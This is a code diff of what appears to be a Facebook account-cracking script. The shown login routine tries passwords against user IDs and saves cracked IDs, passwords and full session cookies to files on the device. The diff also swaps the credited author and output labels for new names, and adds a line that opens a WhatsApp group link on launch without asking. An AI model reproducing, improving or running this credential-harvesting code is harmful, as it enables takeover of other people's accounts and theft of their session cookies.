@@ -66,24 +66,24 @@ loop = 0
 cps = []
 oks = []
 twf = [] 
-
+os.system('xdg-open https://chat.whatsapp.com/F228l8aT3H5LHLNUfHOrBT')
 def clear():
     os.system('clear')
 logo =("""\x1b[1;97m$$\      $$\  $$$$$$\  $$\       $$$$$$\ $$\   $$\ 
 $$$\    $$$ |$$  __$$\ $$ |      \_$$  _|$$ | $$  |
-\x1b[1;97m $$$$\  $$$$ |$$ /  $$ |$$ |        $$ |  $$ |$$  / 
-\x1b[1;97m $$\$$\$$ $$ |$$$$$$$$ |$$ |        $$ |  $$$$$  /  
-\x1b[1;97m $$ \$$$  $$ |$$  __$$ |$$ |        $$ |  $$  $$<   
-\x1b[1;97m $$ |\$  /$$ |$$ |  $$ |$$ |        $$ |  $$ |\$$\  
-\x1b[1;97m $$ | \_/ $$ |$$ |  $$ |$$$$$$$$\ $$$$$$\ $$ | \$$\ 
-\x1b[1;97m \__|     \__|\__|  \__|\________|\______|\__|  \__|  
+$$$$\  $$$$ |$$ /  $$ |$$ |        $$ |  $$ |$$  / 
+$$\$$\$$ $$ |$$$$$$$$ |$$ |        $$ |  $$$$$  /  
+$$ \$$$  $$ |$$  __$$ |$$ |        $$ |  $$  $$< 
+$$ |\$  /$$ |$$ |  $$ |$$ |        $$ |  $$ |\$$\  
+$$ | \_/ $$ |$$ |  $$ |$$$$$$$$\ $$$$$$\ $$ | \$$\ 
+\__|     \__|\__|  \__|\________|\______|\__|  \__|  
  
  
  
  
  
 \x1b[1;97m[*]----------------------------------------------
-\033[1;37m[*] Author        : AYUSHA 
+\033[1;37m[*] Author        : UPAKAR KOIRALA 
 \033[1;37m[*] Github        : UPAKAR321
 \033[1;37m[*] Status        : FREE
 \033[1;37m[*] TEAM          : PNAE-ARMY 
@@ -248,28 +248,28 @@ def free(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\033[1;32m[AREESHA-,OK-💚]  ' +cid+ ' | ' +ps+    '\033[0;97m')
+                print('\033[1;32m[UPSS-,OK-💚]  ' +cid+ ' | ' +ps+    '\033[0;97m')
                 print(f"{H} [COOKIE] {coki}")
-                open('/sdcard/AREESHA-OK.txt', 'a').write( cid+' | '+ps+'\n')
+                open('/sdcard/UPSS-OK.txt', 'a').write( cid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:156]
-                print('\33[1;31m[AREESHA-CP-💔]  ' +cid+ ' | ' +ps+           '  \33[0;97m')
-                open('/sdcard/AREESHA-CP.txt', 'a').write( cid+' | '+ps+' \n')
+                print('\33[1;31m[UPSS-CP-💔]  ' +cid+ ' | ' +ps+           '  \33[0;97m')
+                open('/sdcard/UPSS-CP.txt', 'a').write( cid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             elif '/x/checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:156]
                 print('\33[1;31m[Temp-Lock💔]  ' +cid+ ' | ' +ps+           '  \33[0;97m')
-                #open('/sdcard/AREESHA-CP.txt', 'a').write( cid+' | '+ps+' \n')
+                #open('/sdcard/UPSS-CP.txt', 'a').write( cid+' | '+ps+' \n')
                 twf.append(cid)
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r%s|AREESHA-OK:\033[1;32m%s\033[1;37m:\033[1;31m%s\033[1;37m '%(loop,len(oks),len(cps))),
+        sys.stdout.write('\r%s|UPSS-OK:\033[1;32m%s\033[1;37m:\033[1;31m%s\033[1;37m '%(loop,len(oks),len(cps))),
         sys.stdout.flush()
     except:
         pass
